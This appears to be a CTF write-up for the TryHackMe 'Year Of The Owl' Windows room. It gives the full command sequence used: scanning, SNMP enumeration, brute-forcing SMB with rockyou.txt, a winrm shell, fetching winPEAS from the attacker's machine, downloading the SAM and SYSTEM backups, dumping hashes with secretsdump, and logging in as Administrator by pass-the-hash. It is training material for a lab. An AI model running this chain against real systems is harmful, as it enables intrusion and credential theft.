---
title: "Year Of The Owl"
date: 2025-05-01
draft: false
summary: "Writeup for Year Of The Owl CTF challenge on TryHackMe."
tags: ["windows", "bruteforce", "hash crack"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/yearoftheowl/cover.webp"
  caption: "Year Of The Owl TryHackMe Challenge"
  alt: "Year Of The Owl cover"
platform: "TryHackMe"
---

The foolish owl sits on his throne...
<!--more-->
To access the link, click on the link given below:
- https://tryhackme.com/room/yearoftheowl

## Reconnaissance

I performed an **nmap** aggressive scan on the target to find a bunch of ports open.

```shell
nmap -A -p- TARGET --min-rate 10000 -oN yoto.nmap
```

| Port | Service |
| ---- | ------- |
| 80   | http    |
| 139  | netbios |
| 443  | https   |
| 445  | smb     |
| 3306 | mysql   |
| 3389 | rdp     |

![](https://cdn.ziomsec.com/yearoftheowl/1.webp)

## Initial Foothold

I enumerated the services running on the target but was unable to find anything interesting.

![](https://cdn.ziomsec.com/yearoftheowl/2.webp)

I then tried performed a **udp** scan and found **snmp** to be open.

```shell
nmap -sU -p 161 TARGET
```

![](https://cdn.ziomsec.com/yearoftheowl/3.webp)

I enumerated **snmp** using **snmp-check** and found a username.

```shell
snmp-check TARGET -c openview
```

![](https://cdn.ziomsec.com/yearoftheowl/4.webp)

I bruteforced the **smb** password of this user from *rockyou.txt* using **crackmapexec**.

```shell
crackmapexec smb TARGET -u Jareth -p /usr/share/wordlists/rockyou.txt
```

![](https://cdn.ziomsec.com/yearoftheowl/5.webp)

I then enumerated the shares using this credential, but found nothing.

```shell
smnmap -u Jareth -p sarah -H TARGET
```

![](https://cdn.ziomsec.com/yearoftheowl/6.webp)

I then checked if the credentials were valid for **winrm** and **rdp**.

```shell
nxc rdp TARGET -u 'Jareth' -p 'sarah'
nxc winrm TARGET -u 'Jareth' -p 'sarah'
```

![](https://cdn.ziomsec.com/yearoftheowl/7.webp)

![](https://cdn.ziomsec.com/yearoftheowl/8.webp)

I used **winrm** to get shell a shell on the target.

```shell
evil-winrm -u Jareth -p sarah -t TARGET
```

![](https://cdn.ziomsec.com/yearoftheowl/9.webp)

Finally I captured the user flag from *Jareth*'s *Desktop*.

![](https://cdn.ziomsec.com/yearoftheowl/10.webp)

## Privilege Escalation

I downloaded and ran **winPEAS** to find misconfigurations that could help me escalate my privs.

```shell
$ iwr http://KALI/winPEAS/ps1 -OutFile C:\Users\Jareth\Desktop\winPEAS.ps1
$ ./winPEAS.ps1
```


I found a backup of the **sam** and **system** registries.

![](https://cdn.ziomsec.com/yearoftheowl/11.webp)

![](https://cdn.ziomsec.com/yearoftheowl/12.webp)

Hence, I copied these backups to the desktop and then downloaded them on my system.

```shell
cd C:\$Recylce.Bin\S-1-5-21-1987495829-1628902820-919763334-1001
copy system.bak 'C:\Users\Jareth\Desktop\system.bak'
copy sam.bak 'C:\Users\Jareth\Desktop\sam.bak'
download system.bak
download sam.bak
```

![](https://cdn.ziomsec.com/yearoftheowl/13.webp)

I then cracked them using **`impacket-secretsdump`** and found the Administrator hash.

```shell
impacket-secretsdump -system system.bak -sam sam.bak local
```

![](https://cdn.ziomsec.com/yearoftheowl/14.webp)

I then used the Administrator's hash to get shell access on the target using **winrm** and captured the root flag from *Desktop*.

```shell
evil-winrm -u Administrator -H LM_HASH -i TARGET
```

![](https://cdn.ziomsec.com/yearoftheowl/15.webp)

That's it from my side! Until next time.

---
